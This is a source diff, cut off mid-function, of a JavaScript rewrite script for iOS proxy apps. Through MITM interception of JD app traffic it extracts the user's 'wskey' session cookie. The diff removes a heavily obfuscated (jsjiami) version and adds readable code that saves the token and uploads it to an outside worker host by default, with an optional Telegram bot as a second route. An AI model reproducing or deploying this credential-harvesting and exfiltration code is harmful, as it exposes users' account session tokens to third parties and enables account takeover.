@@ -1,27 +1,175 @@
 /*
+脚本名称：京东 WSKEY
+更新时间：2022-11-03
+使用方法：打开 京东App --> 消息中心（右上角）获取京东 WSKEY。（自用脚本，自动上传，请勿使用。）
+重写订阅：https://raw.githubusercontent.com/FoKit/Scripts/main/rewrite/get_jd_wskey.sgmodule
+BoxJs 订阅：https://raw.githubusercontent.com/FoKit/Scripts/main/boxjs/fokit.boxjs.json
 
-获取京东 WSKEY
-使用方法：打开京东App --> 消息中心（右上角）获取京东 WSKEY
+================Quantumult X配置=================
+[rewrite_local]
+^https:\/\/api\-dd\.jd\.com\/client\.action\?functionId=getSessionLog url script-echo-response https://raw.githubusercontent.com/FoKit/Scripts/main/scripts/jd_wskey_tg.js
 
-自用脚本，请勿使用！！！
-
-【MITM配置】
+[MITM]
 hostname = api-dd.jd.com
 
-【Surge脚本配置】
+====================Surge配置====================
 [Script]
-获取京东 WSKEY = type=http-request,pattern=^https:\/\/api\-dd\.jd\.com\/client\.action\?functionId=getSessionLog,requires-body=1,max-size=0,timeout=1000,script-path=https://raw.githubusercontent.com/Fokit/Quantumult-X/main/scripts/jd_wskey_tg.js,script-update-interval=0
+京东 WSKEY = type=http-request,pattern=^https:\/\/api\-dd\.jd\.com\/client\.action\?functionId=getSessionLog,requires-body=1,max-size=0,timeout=1000,script-path=https://raw.githubusercontent.com/Fokit/Quantumult-X/main/scripts/jd_wskey_tg.js,script-update-interval=0
 
-【Loon脚本配置】
+[MITM]
+hostname = %APPEND% api-dd.jd.com
+
+====================Loon配置=====================
 [Script]
-http-request ^https:\/\/api\-dd\.jd\.com\/client\.action\?functionId=getSessionLog tag=获取京东 WSKEY, script-path=https://raw.githubusercontent.com/FoKit/Quantumult-X/main/scripts/jd_wskey_tg.js,requires-body=1
+http-request ^https:\/\/api\-dd\.jd\.com\/client\.action\?functionId=getSessionLog tag=京东 WSKEY, script-path=https://raw.githubusercontent.com/FoKit/Scripts/main/scripts/jd_wskey_tg.js,requires-body=1
 
-【 QX  脚本配置 】
-[rewrite_local]
-^https:\/\/api\-dd\.jd\.com\/client\.action\?functionId=getSessionLog url script-echo-response https://raw.githubusercontent.com/FoKit/Quantumult-X/main/scripts/jd_wskey_tg.js
+[MITM]
+hostname = api-dd.jd.com
 
 */
 
-var _0xodN='jsjiami.com.v6',_0xodN_=['‮_0xodN'],_0x389e=[_0xodN,'w64Ow4UDQEYgwrUbCw==','B8O6w79Sw7k=','w4Emw6RQw60=','wpnCtho=','f8Kuw6nDlhA=','EcKEKg==','4puh77qYwrF8MsOswrTDoEHmnr7ljprlibvvvaLngb7lh47mna/nn6XorbfmgJXjgohww6w=','wopbwq4=','A0vCkgFq','woHDj0EHKg==','CywW','UOKYu++7qBPlhqjlhYbkuJTkuZ/Dk2fCu8ObLMKZD+WGuueMl+mWrOiuqBLig7Hvu6HCgQ==','NMKXe8KGdMKRL8KVJg==','w59OEwcyw544','VMKGElEs','wrnDsCzCjMOPwrg=','w5wgw7Q3f28L','VcK2M3Y=','4piS77uGeeafgOWJmOS5jOWNjeeXiO+8nOiuvOeoqOWRj+mGmOisteODtA==','w5ILw4oXUQ==','w7AYwqjCs8Kf','XcOEw5tIdg==','44C76LW75Yyo','6aah5q+G5Ye/5YWX5Luo5LuyIVzDq8OEF2Y=','wpEvw6fDhsOC','wo7Cpz4vw48=','wrBQYcKcdipnwrg5wqkJL3A/wpF/w799wroRNcOdw5zDqi83CsO8CcOVIEzChg==','w4cIwqzCr2w=','wozDgXUoLw==','wp3DpcORbMOY','WcKhIEIx','e8KgK3d0','wqHDicObw4bCrg==','w4Q8wpjCh0U=','wpXDosOk','wpsxSgE=','wocZw4jDvg==','Q8K8Lldiw5PCiw==','TMOvw5MVJQ==','XQnCtkE5','w45pfcKow7rDjsO9DlzDuFcow542w5Vow7jChcKJNgTCusK0DcOzwr16w44=','GMKUA1wgwqNkeMOLw641Wg==','w7kbwpjCo0o=','I8OiwpEtwqPDssOjdg==','DSnCulo7w48=','TknCsChTwoUUw4PCsznDsmx2FMOObwQQWsKwTS3DicOPGcKMXzHCgVA=','b3BYdA==','VsO3w7nCuMOR','JS4lw63Cuw==','w7Asw7kFWw==','w4PCgMK5','wojDqMOSZg==','FMOtwrwvwpA=','w7slAsOefA==','EMO2woNefA==','w7EswpfCglLDsw==','JcO4w41Lw4U=','cXpOZMORwqsjw6vCicO6','w4dKABAy','E8O6w4Jvw4c=','d8Oew5MlJQ==','XMKHw53DtTI=','c3BMRcO2wqk=','c3BM','8KW+gkYmwrXCgcKpB8KN6Iyo5Y255oii5Yq3wqIj','wphSZ8KWD8OSwqQ=','8Y2/o8KTXUwzY8Oxw4vojLzlj7XmiJXli77jgoU=','CsOzwoY9wos=','awMjXMKawrPCukZ0CQ==','EMOiwpFXRg==','wqvDrsOrVsOl','w6k6w5AOSQ==','w5Ymw70=','4pmY77qewqPnv7/nuJblvbnlubTvvYHor4HnqqjlkZTphYzor4Xjgphrbg==','MsOvwoMdwp3Dr8Om','4puI77iiw7nnvIrnu67lv6XluYDvvqrorJvnqYPlkpnph4Por7zjgaY=','AyQh','a8OLw7jCm8O5w5nDqVrCrQ==','IXIQFcKR','MxQhRcKlEsKEbkdI','wpjCqho=','Agk4T8K5beWMpeaVseacquivguODnnI=','w6ofwozCnMKef8Or','woVPesKVcWnlj4TmlrzmnZnorKnjgaU=','W8KIAXc2wpw=','AjlZwrYG','MMOOwq5Gdw==','WsK2w4PDnDw=','4pqL77mSw7/mnK/li67ku7/ljqvnl5/vvpPorK/nq7/lkpzphb/orpfjgr0=','woPDuHwIEQ==','woHDvX0kPQ==','w74sw5B3w7A=','wpXDrsOG','KcKCZMKK','M8O/wpIt','GW4VNcKHwr7CjQ==','wp7DsSLChMO+','B8OnwpoXwoU=','4piS77uGeee+nOe4peW9g+W6mu+/rOivp+ephuWQq+mGjOiugOODosO8bg==','woYJw5nDjsOlw6dl','4pqR77uWfee9gue7n+W+peW7ku+9nOius+epmuWSsemFseiuuuOAhw==','6I2Q5Y++5Lml5LuCFlwxw5/Cjl8=','w454aMK8w6zChsKh','NsOUw4pxw6dU','wr3DuirCrcOYwrjCjw==','bR4+WMKBwok=','CiIFwpDCug==','fxrCgGAAwqYbwqPDkMKTwrfDnA==','wqwPw4dufgxH','w48pwrTCncKmVMOew4sGwoIpw5DCtMOsJkfDvis=','I8OfwrHCn2p6w7XCmMKXCcO8wpdeKcO9bwfDg8KFw5TCssKkwpHDl0ZKw4HDhBHDlH/Cu8KBFHQ5w60wOMOsBsK4w53DnRNJ','wqEXeDEbSRwbwplK','Zh/Cn8O8XMOtw68=','woLDjADCjMOkwpXCqMK5QcKSUcKQZcOxw7UQ','GcKXwrkUD8KsVWwvGkvDkMO5w7U=','FyIDwoDCtw==','IMKGfcKLe8KCJw==','w60aw5ETSlwmwq0NGsK2TMOaX8K9VA==','5p2f5ouF5YqVOsOZYi0TLw==','wo/DosOow4vCszclPkI=','44G36LWl5Y6G44Oi','SMOrw7vCpMOw','44Cn6LeB5Y6R','5pui5pWc5Lip5LqwfxrCnsOrw6Fj','UDnCrMOsRQ==','6aS95q2E5YSt5YW35LiZ5LuKdQcHQMOsFA==','4pmY77qewqPDucKZMAkUFuaej+WOguWIqe+8nOeAo+WGmuaegeeepeitgeaAquOApw==','4pq277ujwqXlhLXlhLrku6Hku5HCgMOzacKNwpNGT+Wmvei1sw==','6KyP6YWc6K2W44Ks','PzHDrcOyOQ==','wpE1VAc=','wpvDlMOzw7fCrw==','wrjDrCw=','NMO6wopW','wrgfw5F+','w54sw6k1','wq8Fw51v','woPCthbCrCxt','wq11w4kKw5Nxw5Ak','wps/w6RkVw==','wpfCkSUZw58=','wonDi2sBOQ==','wprDu8Ouw6LCjw==','w5TCoDfCqQ==','woRHwqbCtV9u','w4LCjsKqF8KI','ccO/wqjDi2w=','f8O1w4BuUg==','YcKFDlAQ','w7YfwprCvMKqe8Omw6M4wqQ=','w7IRw4ksRg==','wrDDtiPCncOX','BCwewpjCu3A=','LMO2w6VICQ==','XMK4KXBr','wr/CljTCgzk=','wqMyTwYc','w4YGI8ObSHPDqMOoVR4=','SDLCsEkmwpc=','w44iwpbCicKb','Y8KdPFtJ','csOHw57CpsOS','fsOZw4HCn8Oh','X8Kkw7DDiis=','D8K7WsKVTw==','QMKdL1Un','wo/Dq8OKw4nCqQ==','w7MswpzCgXPDqxXDlDoQ','wr/Djkol','wp5HUMKcXA==','wqVQVcK+LQ==','wr/Dpx/CncO4','dMOaw6TClcOjw5Y=','EcKMTsKYVg==','eMKJw6DDiAo9wqHDj8OFXg==','w4ksw64ycncT','BsOPw5dzw6BWDzAP','Ll3Cixdz','wqUPw5ZuSghKw4fCisOv','MEjsjiaYImqi.cgoVzmqX.klWvh6=='];if(function(_0x55b816,_0x3d6ee9,_0x311b86){function _0xbcf9f5(_0x411056,_0x35d408,_0x172d71,_0x357c21,_0x4d34ea,_0x54e56d){_0x35d408=_0x35d408>>0x8,_0x4d34ea='po';var _0x17391e='shift',_0x45c008='push',_0x54e56d='‮';if(_0x35d408<_0x411056){while(--_0x411056){_0x357c21=_0x55b816[_0x17391e]();if(_0x35d408===_0x411056&&_0x54e56d==='‮'&&_0x54e56d['length']===0x1){_0x35d408=_0x357c21,_0x172d71=_0x55b816[_0x4d34ea+'p']();}else if(_0x35d408&&_0x172d71['replace'](/[MEYIqgVzqXklWh=]/g,'')===_0x35d408){_0x55b816[_0x45c008](_0x357c21);}}_0x55b816[_0x45c008](_0x55b816[_0x17391e]());}return 0xf8b32;};return _0xbcf9f5(++_0x3d6ee9,_0x311b86)>>_0x3d6ee9^_0x311b86;}(_0x389e,0x1cb,0x1cb00),_0x389e){_0xodN_=_0x389e['length']^0x1cb;};function _0x44e5(_0x45346e,_0x3ae3a4){_0x45346e=~~'0x'['concat'](_0x45346e['slice'](0x1));var _0x535041=_0x389e[_0x45346e];if(_0x44e5['MBDmck']===undefined){(function(){var _0x2997fe=function(){var _0x2e6071;try{_0x2e6071=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x8b63b6){_0x2e6071=window;}return _0x2e6071;};var _0x1ca10e=_0x2997fe();var _0x172aae='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1ca10e['atob']||(_0x1ca10e['atob']=function(_0x4049c5){var _0x159492=String(_0x4049c5)['replace'](/=+$/,'');for(var _0x3d1239=0x0,_0xe6f1a5,_0x23f2b4,_0x47a8c7=0x0,_0x3ebdc1='';_0x23f2b4=_0x159492['charAt'](_0x47a8c7++);~_0x23f2b4&&(_0xe6f1a5=_0x3d1239%0x4?_0xe6f1a5*0x40+_0x23f2b4:_0x23f2b4,_0x3d1239++%0x4)?_0x3ebdc1+=String['fromCharCode'](0xff&_0xe6f1a5>>(-0x2*_0x3d1239&0x6)):0x0){_0x23f2b4=_0x172aae['indexOf'](_0x23f2b4);}return _0x3ebdc1;});}());function _0x556767(_0x3e3813,_0x3ae3a4){var _0x54c7b9=[],_0x434c51=0x0,_0x5b597a,_0x369c3d='',_0x432758='';_0x3e3813=atob(_0x3e3813);for(var _0x162b22=0x0,_0xe04182=_0x3e3813['length'];_0x162b22<_0xe04182;_0x162b22++){_0x432758+='%'+('00'+_0x3e3813['charCodeAt'](_0x162b22)['toString'](0x10))['slice'](-0x2);}_0x3e3813=decodeURIComponent(_0x432758);for(var _0x6d9b08=0x0;_0x6d9b08<0x100;_0x6d9b08++){_0x54c7b9[_0x6d9b08]=_0x6d9b08;}for(_0x6d9b08=0x0;_0x6d9b08<0x100;_0x6d9b08++){_0x434c51=(_0x434c51+_0x54c7b9[_0x6d9b08]+_0x3ae3a4['charCodeAt'](_0x6d9b08%_0x3ae3a4['length']))%0x100;_0x5b597a=_0x54c7b9[_0x6d9b08];_0x54c7b9[_0x6d9b08]=_0x54c7b9[_0x434c51];_0x54c7b9[_0x434c51]=_0x5b597a;}_0x6d9b08=0x0;_0x434c51=0x0;for(var _0x498552=0x0;_0x498552<_0x3e3813['length'];_0x498552++){_0x6d9b08=(_0x6d9b08+0x1)%0x100;_0x434c51=(_0x434c51+_0x54c7b9[_0x6d9b08])%0x100;_0x5b597a=_0x54c7b9[_0x6d9b08];_0x54c7b9[_0x6d9b08]=_0x54c7b9[_0x434c51];_0x54c7b9[_0x434c51]=_0x5b597a;_0x369c3d+=String['fromCharCode'](_0x3e3813['charCodeAt'](_0x498552)^_0x54c7b9[(_0x54c7b9[_0x6d9b08]+_0x54c7b9[_0x434c51])%0x100]);}return _0x369c3d;}_0x44e5['KYfKlI']=_0x556767;_0x44e5['JkakVk']={};_0x44e5['MBDmck']=!![];}var _0x1883ba=_0x44e5['JkakVk'][_0x45346e];if(_0x1883ba===undefined){if(_0x44e5['RgoSTN']===undefined){_0x44e5['RgoSTN']=!![];}_0x535041=_0x44e5['KYfKlI'](_0x535041,_0x3ae3a4);_0x44e5['JkakVk'][_0x45346e]=_0x535041;}else{_0x535041=_0x1883ba;}return _0x535041;};const $=new Env(_0x44e5('‮0','838Z'));let CK=$request[_0x44e5('‫1','l1mi')][_0x44e5('‫2','6x1B')]||$request[_0x44e5('‮3','VzMp')][_0x44e5('‮4','$KUx')];const pin=encodeURIComponent(CK[_0x44e5('‮5','R25*')](/pin=([^=;]+?);/)[0x1]);const key=CK[_0x44e5('‮5','R25*')](/wskey=([^=;]+?);/)[0x1];$[_0x44e5('‫6','&c%W')]=$[_0x44e5('‫7','9U#i')](_0x44e5('‮8','3Lf5'))||_0x44e5('‫9','xZIL');$[_0x44e5('‫a','4@lG')]=!$[_0x44e5('‫b','!xyL')](_0x44e5('‫c','VzMp'))?[_0x44e5('‫d','PFrh')]:JSON[_0x44e5('‮e','R25*')]($[_0x44e5('‮f',']TU@')](_0x44e5('‫10','57cK')));!(async()=>{var _0x19c4f4={'KSIJl':function(_0x3c7198,_0x26a7d1){return _0x3c7198===_0x26a7d1;},'VbhbT':function(_0x395f91,_0x3eac3b){return _0x395f91!==_0x3eac3b;},'XnhbP':function(_0x2da488,_0x30848e){return _0x2da488||_0x30848e;},'cEpYe':_0x44e5('‮11','6x1B'),'PUWnH':function(_0x59c62b,_0x102d3f){return _0x59c62b(_0x102d3f);},'FpRLA':_0x44e5('‫12','sQho'),'bjmLE':_0x44e5('‫13','R25*'),'HXSzU':function(_0x123170,_0x47594f){return _0x123170!==_0x47594f;},'eihTj':_0x44e5('‮14','T59&'),'VXiQd':function(_0x2018d4,_0x18a36f){return _0x2018d4+_0x18a36f;},'RDaHJ':function(_0x5bf346,_0x5f3f9f){return _0x5bf346+_0x5f3f9f;},'jxTTE':_0x44e5('‮15','5o#9'),'ffKmv':function(_0x57bcd2,_0x145b45){return _0x57bcd2+_0x145b45;},'IHuft':_0x44e5('‮16','xZIL'),'wzIgc':_0x44e5('‮17','!xyL'),'OgAlC':function(_0x220e5e,_0xb8abe1){return _0x220e5e+_0xb8abe1;},'VoGwL':_0x44e5('‮18','d8N7'),'rAZHw':function(_0x10e5f9,_0x5f0781,_0x8e46ca){return _0x10e5f9(_0x5f0781,_0x8e46ca);},'jCPBX':function(_0x1716d6,_0x570741){return _0x1716d6(_0x570741);},'iBlzO':_0x44e5('‫19','sQho'),'kfKZX':_0x44e5('‫1a','xZIL'),'NtxJR':_0x44e5('‮1b','sQho')};if(_0x19c4f4[_0x44e5('‫1c','iVu8')](!pin,!key)){$[_0x44e5('‮1d','4@lG')]=_0x19c4f4[_0x44e5('‫1e','sQho')];$[_0x44e5('‫1f','VzMp')]($[_0x44e5('‮20',')(l)')],$[_0x44e5('‫21','9U#i')],$[_0x44e5('‫22','57cK')]);$[_0x44e5('‮23','9U#i')]();}try{const _0x306cd0=_0x44e5('‮24','Glze')+key+_0x44e5('‮25','B#pC')+pin+';';const _0x257d44=pin;const _0x12fcd0=_0x19c4f4[_0x44e5('‮26','9U#i')](decodeURIComponent,_0x257d44);let _0x2ab834=JSON[_0x44e5('‫27','d2Sc')]($[_0x44e5('‫7','9U#i')](_0x19c4f4[_0x44e5('‫28','BnIQ')])||'[]');let _0x36f927;let _0x46a73b=_0x19c4f4[_0x44e5('‮29','sQho')];const _0x35943e=_0x2ab834[_0x44e5('‫2a','rGyL')]((_0x1dc702,_0x550893)=>{const _0x1b5955=_0x1dc702[_0x44e5('‫2b','838Z')];const _0x57c81a=_0x1b5955?_0x1b5955[_0x44e5('‫2c','ZeLS')](/pin=.+?;/)?_0x1b5955[_0x44e5('‫2d','U1&&')](/pin=(.+?);/)[0x1]:null:null;const _0x3d88f4=_0x19c4f4[_0x44e5('‫2e','PFrh')](_0x257d44,_0x57c81a);if(_0x3d88f4){_0x36f927=_0x550893;if(_0x19c4f4[_0x44e5('‮2f','5o#9')](_0x1b5955,_0x306cd0)){$[_0x44e5('‮30','3Lf5')]=!![];}}return _0x3d88f4;});let _0x23c180='';if(_0x35943e){if(_0x19c4f4[_0x44e5('‫31','57cK')](_0x19c4f4[_0x44e5('‮32','VzMp')],_0x19c4f4[_0x44e5('‮32','VzMp')])){const _0x6f7f9a=item[_0x44e5('‮33','R25*')];const _0x63120b=_0x6f7f9a?_0x6f7f9a[_0x44e5('‫34','Eb2%')](/pin=.+?;/)?_0x6f7f9a[_0x44e5('‫35','wUgk')](/pin=(.+?);/)[0x1]:null:null;const _0xa7efef=_0x19c4f4[_0x44e5('‮36','Glze')](_0x257d44,_0x63120b);if(_0xa7efef){_0x36f927=index;if(_0x19c4f4[_0x44e5('‫37','4@lG')](_0x6f7f9a,_0x306cd0)){$[_0x44e5('‮38','5XJs')]=!![];}}return _0xa7efef;}else{_0x2ab834[_0x36f927][_0x44e5('‫39','&c%W')]=_0x306cd0;_0x46a73b=_0x19c4f4[_0x44e5('‮3a','3Lf5')](_0x19c4f4[_0x44e5('‮3b','wUgk')](_0x19c4f4[_0x44e5('‮3c','T59&')],_0x19c4f4[_0x44e5('‮3d','T59&')](_0x36f927,0x1)),'】');_0x23c180=_0x19c4f4[_0x44e5('‮3e','xZIL')];}}else{if(_0x19c4f4[_0x44e5('‫3f',']TU@')](_0x19c4f4[_0x44e5('‮40','5o#9')],_0x19c4f4[_0x44e5('‫41','sQho')])){$[_0x44e5('‫42','T!a%')]=!![];}else{_0x2ab834[_0x44e5('‫43','BnIQ')]({'userName':_0x12fcd0,'cookie':_0x306cd0});_0x46a73b=_0x19c4f4[_0x44e5('‫44','qr0*')](_0x19c4f4[_0x44e5('‮45','02zf')](_0x19c4f4[_0x44e5('‮46','VzMp')],_0x2ab834[_0x44e5('‫47','T59&')]),'】');_0x23c180=_0x19c4f4[_0x44e5('‮48',']TU@')];$[_0x44e5('‫49','xZIL')]=!![];}}$[_0x44e5('‮4a','57cK')](JSON[_0x44e5('‮4b','6x1B')](_0x2ab834,null,0x2),_0x19c4f4[_0x44e5('‫4c','@H$C')]);if($[_0x44e5('‮4d','9U#i')]){for(const _0x57f7cc of $[_0x44e5('‫4e','57cK')]){await _0x19c4f4[_0x44e5('‮4f','6x1B')](updateCookie,_0x306cd0,_0x57f7cc);await _0x19c4f4[_0x44e5('‮50','d8N7')](showMsg,_0x57f7cc);}}else{$[_0x44e5('‫51','Glze')](_0x19c4f4[_0x44e5('‮52','xZIL')]);console[_0x44e5('‮53','h&KB')](_0x44e5('‮54','Eb2%')+_0x306cd0);}return;}catch(_0x3a92fc){$[_0x44e5('‫55','838Z')](_0x19c4f4[_0x44e5('‫56','@H$C')],'',_0x19c4f4[_0x44e5('‫57','BnIQ')]);console[_0x44e5('‫58','R25*')](_0x44e5('‮59',')(l)')+JSON[_0x44e5('‮4b','6x1B')](_0x3a92fc)+'\x0a\x0a'+_0x3a92fc+'\x0a\x0a'+JSON[_0x44e5('‫5a',']TU@')]($request[_0x44e5('‫5b','q9qk')])+'\x0a');}})()[_0x44e5('‫5c','5o#9')](_0x187374=>$[_0x44e5('‮5d','VzMp')](_0x187374))[_0x44e5('‫5e','57cK')](()=>$[_0x44e5('‫5f','wUgk')]());function updateCookie(_0x5be432,_0xd145e8){var _0x525ab2={'qZXim':_0x44e5('‮60','rGyL'),'vTicv':function(_0x500f85){return _0x500f85();},'NHsJF':function(_0x524517,_0x4f8f9f){return _0x524517===_0x4f8f9f;},'JecSH':_0x44e5('‮61','57cK'),'fAguI':function(_0x570c9d,_0x4dd835){return _0x570c9d!==_0x4dd835;},'JkXYm':_0x44e5('‮62','ysjv'),'Jyvdw':function(_0x47d171,_0xfe0c88){return _0x47d171===_0xfe0c88;},'SsJXZ':_0x44e5('‫63','PFrh'),'VFQou':function(_0x7fc76){return _0x7fc76();},'ZAUJJ':function(_0x1f5e63,_0xd27b27){return _0x1f5e63+_0xd27b27;},'CzLeW':function(_0x5175ff,_0x47e786){return _0x5175ff+_0x47e786;},'expbg':_0x44e5('‮64','&c%W'),'nFFpu':_0x44e5('‫65','5o#9'),'YXXhd':_0x44e5('‮66','vf$['),'Yuabc':_0x44e5('‮67','d2Sc'),'dRaFl':_0x44e5('‮68','qr0*')};return new Promise(_0x4dfa0e=>{var _0x31cfec={'TgLvl':function(_0x5c5126,_0x3ede30){return _0x525ab2[_0x44e5('‮69','T!a%')](_0x5c5126,_0x3ede30);},'SFDaa':function(_0x9e9ee2,_0x152eaa){return _0x525ab2[_0x44e5('‮6a','BnIQ')](_0x9e9ee2,_0x152eaa);},'JmdmM':_0x525ab2[_0x44e5('‮6b','O49v')],'PChQK':_0x525ab2[_0x44e5('‮6c','5o#9')]};if(_0x525ab2[_0x44e5('‫6d','wUgk')](_0x525ab2[_0x44e5('‮6e','sQho')],_0x525ab2[_0x44e5('‫6f','T!a%')])){$[_0x44e5('‮70','sQho')]($[_0x44e5('‫71','4@lG')],$[_0x44e5('‫72','vf$[')],$[_0x44e5('‮73','wUgk')]||_0x525ab2[_0x44e5('‫74','7X%n')]);_0x525ab2[_0x44e5('‮75','&c%W')](_0x4dfa0e);}else{const _0x16c911={'url':_0x44e5('‫76','l1mi')+$[_0x44e5('‫6','&c%W')]+_0x44e5('‫77','5o#9'),'headers':{'Content-Type':_0x525ab2[_0x44e5('‮78','T!a%')]},'body':_0x44e5('‫79','nJ(9')+_0xd145e8+_0x44e5('‮7a','&c%W')+_0x5be432+_0x44e5('‫7b','@H$C')};$[_0x44e5('‮7c','jus3')](_0x16c911,(_0x1325ae,_0x58608e,_0xcaa01d)=>{try{if(_0x1325ae){if(_0x525ab2[_0x44e5('‫7d','T59&')](_0x525ab2[_0x44e5('‮7e','CxSn')],_0x525ab2[_0x44e5('‮7f','57cK')])){console[_0x44e5('‫80','ZeLS')](''+JSON[_0x44e5('‫5a',']TU@')](_0x1325ae));}else{cookiesData[_0x44e5('‮81','O49v')]({'userName':decodeName,'cookie':_0x5be432});cookieName=_0x31cfec[_0x44e5('‫82','nJ(9')](_0x31cfec[_0x44e5('‮83','5XJs')](_0x31cfec[_0x44e5('‮84',')(l)')],cookiesData[_0x44e5('‫85','T!a%')]),'】');tipPrefix=_0x31cfec[_0x44e5('‮86','6x1B')];$[_0x44e5('‫87','jus3')]=!![];}}else{_0xcaa01d=JSON[_0x44e5('‫88','q9qk')](_0xcaa01d);if(_0xcaa01d['ok']){if(_0x525ab2[_0x44e5('‫89','6x1B')](_0x525ab2[_0x44e5('‮8a','7X%n')],_0x525ab2[_0x44e5('‫8b','xZIL')])){$[_0x44e5('‮8c','jus3')](e,_0x58608e);}else{console[_0x44e5('‮8d','jus3')](_0x44e5('‫8e','o@c^')+_0x5be432);$[_0x44e5('‮8f','02zf')]=_0x44e5('‫90','9U#i')+_0x5be432;}}else if(_0x525ab2[_0x44e5('‫91','nJ(9')](_0xcaa01d[_0x44e5('‫92','$KUx')],0x190)){if(_0x525ab2[_0x44e5('‮93',')(l)')](_0x525ab2[_0x44e5('‫94','O49v')],_0x525ab2[_0x44e5('‫95','57cK')])){console[_0x44e5('‫96','57cK')](_0x44e5('‫97','sQho')+_0x5be432);$[_0x44e5('‮98','nJ(9')]=_0x44e5('‫99','@H$C')+_0x5be432;}else{console[_0x44e5('‮9a','CxSn')](''+JSON[_0x44e5('‮9b','T59&')](_0x1325ae));}}else if(_0x525ab2[_0x44e5('‫9c','o@c^')](_0xcaa01d[_0x44e5('‮9d','ob2f')],0x191)){console[_0x44e5('‮9e','Glze')](_0x44e5('‮9f','ob2f'));$[_0x44e5('‫a0','3Lf5')]=_0x44e5('‮a1','qr0*');}}}catch(_0x3204e1){$[_0x44e5('‮a2','5o#9')](_0x3204e1,_0x58608e);}finally{_0x525ab2[_0x44e5('‮a3','334W')](_0x4dfa0e);}});}});}function showMsg(){var _0xa333a={'LCEEi':function(_0x29be38,_0xe5bcc){return _0x29be38!==_0xe5bcc;},'NFDiE':_0x44e5('‮a4',')(l)'),'UIdeE':_0x44e5('‫a5','xZIL'),'KniMC':_0x44e5('‮a6','&c%W'),'GmjNy':function(_0x5968d5){return _0x5968d5();}};return new Promise(_0x2d685a=>{if(_0xa333a[_0x44e5('‮a7','BnIQ')](_0xa333a[_0x44e5('‫a8','BnIQ')],_0xa333a[_0x44e5('‫a9','d8N7')])){$[_0x44e5('‮aa','O49v')]($[_0x44e5('‮ab',']TU@')],$[_0x44e5('‫ac','nJ(9')],$[_0x44e5('‫ad','o@c^')]||_0xa333a[_0x44e5('‮ae','VzMp')]);_0xa333a[_0x44e5('‮af','nJ(9')](_0x2d685a);}else{console[_0x44e5('‫96','57cK')](_0x44e5('‫b0','rGyL')+cookie);$[_0x44e5('‮b1','vf$[')]=_0x44e5('‫b2','wUgk')+cookie;}});};_0xodN='jsjiami.com.v6';
+const $ = new Env('京东 WSKEY');
+const WSKEY = $request.headers['Cookie'] || $request.headers['cookie'];
+const pin = encodeURIComponent(WSKEY.match(/pin=([^=;]+?);/)[1]);
+const key = WSKEY.match(/wskey=([^=;]+?);/)[1];
+$.bot_token = $.getdata('WSKEY_TG_BOT_TOKEN') || '';
+$.chat_ids = $.getdata('WSKEY_TG_USER_ID') || [];
+
+!(async () => {
+    if (!pin || !key) {
+        $.desc = '⚠️ WSKEY 获取失败';
+        $.msg($.name, '', $.desc);
+        $.done();
+    }
+    const cookie = `wskey=${key};pt_pin=${pin};`;
+    const userName = pin;
+    const decodeName = decodeURIComponent(userName);
+    let cookiesData = JSON.parse($.getdata('wskeyList') || '[]');
+    let updateIndex;
+    const existCookie = cookiesData.find((item, index) => {
+        const ck = item.cookie;
+        const Account = ck ? ck.match(/pin=.+?;/) ? ck.match(/pin=(.+?);/)[1] : null : null;
+        const verify = userName === Account;
+        if (verify) {
+            updateIndex = index;
+            if (ck !== cookie) {
+                $.needUpload = true;
+            }
+        }
+        return verify;
+    });
+    if (existCookie) {
+        cookiesData[updateIndex].cookie = cookie;
+    } else {
+        cookiesData.push({ userName: decodeName, cookie: cookie, });
+        $.needUpload = true;
+    }
+    $.setdata(JSON.stringify(cookiesData, null, 2), 'wskeyList');
+    if ($.needUpload) {
+        $.chat_ids = JSON.parse($.chat_ids);
+        if ($.chat_ids == []) {
+            await updateCookie_1(cookie, chat_id = []);
+        } else {
+            for (const chat_id of $.chat_ids) {
+                let update = await updateCookie_1(cookie, chat_id);
+                if ($.bot_token && !update) {
+                    await updateCookie_2(cookie, chat_id);
+                }
+            }
+        }
+    } else {
+        $.msg($.name, '⚠️ 无需更新 WSKEY。', cookie);
+        console.log(`⚠️ 无需更新 WSKEY。\n${cookie}\n`);
+    }
+    return;
+})().catch((e) => $.logErr(e)).finally(() => $.done());
+
+function updateCookie_1(wskey, chat_id) {
+    url = "https://wskey.fokit.workers.dev/msg";
+    if ($.bot_token) {
+        url += `?bot_token=${$.bot_token}`;
+    };
+    if (chat_id != []) {
+        url += `&chat_id=${chat_id}`;
+    };
+    let opt = {
+        url,
+        body: `text=${wskey}`,
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+        timeout: 10000,
+    };
+    return new Promise(resolve => {
+        $.post(opt, async (err, resp, data) => {
+            try {
+                $.success = true;
+                if (err) {
+                    console.log(`${JSON.stringify(err)}\n`)
+                    $.success = false;
+                } else {
+                    data = JSON.parse(data);
+                    if (data.ok) {
+                        $.subt = '🎉 WSKEY 提交成功。';
+                        $.msg($.name, $.subt, wskey);
+                        console.log(`${$.subt}\n${wskey}\n`);
+                    } else if (data.error_code === 400) {
+                        $.subt = '⚠️ Telegram bot 无发送消息权限。';
+                        $.msg($.name, $.subt, wskey);
+                        console.log(`${$.subt}\n${wskey}\n`);
+                    } else if (data.error_code === 401) {
+                        $.subt = '⚠️ Telegram bot token 填写错误。';
+                        $.msg($.name, $.subt, wskey);
+                        console.log(`${$.subt}\n${wskey}\n`);
+                    } else {
+                        $.success = false;
+                    }
+                }
+            } catch (error) {
+                $.logErr(error);
+            } finally {
+                resolve($.success);
+            }
+        })
+    })
+}
+
+function updateCookie_2(wskey, chat_id) {
+    return new Promise((resolve) => {
+        const opts = {
+            url: `https://api.telegram.org/bot${$.bot_token}/sendMessage`,
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: `chat_id=${chat_id}&text=${wskey}&disable_web_page_preview=true`,
+        };
+        $.post(opts, (err, resp, data) => {
+            try {
+                if (err) {
+                    console.log(`${JSON.stringify(err)}\n`);
+                } else {
+                    data = JSON.parse(data);
+                    if (data.ok) {
+                        $.subt = '🎉 WSKEY 提交成功。';
+                        console.log(`${$.subt}\n${wskey}\n`);
+                        $.msg($.name, $.subt, wskey);
+                    } else if (data.error_code === 400) {
+                        $.subt = '⚠️ Telegram bot 无发送消息权限。';
+                        console.log(`${$.subt}\n${wskey}\n`);
+                        $.msg($.name, $.subt, wskey);
+                    } else if (data.error_code === 401) {
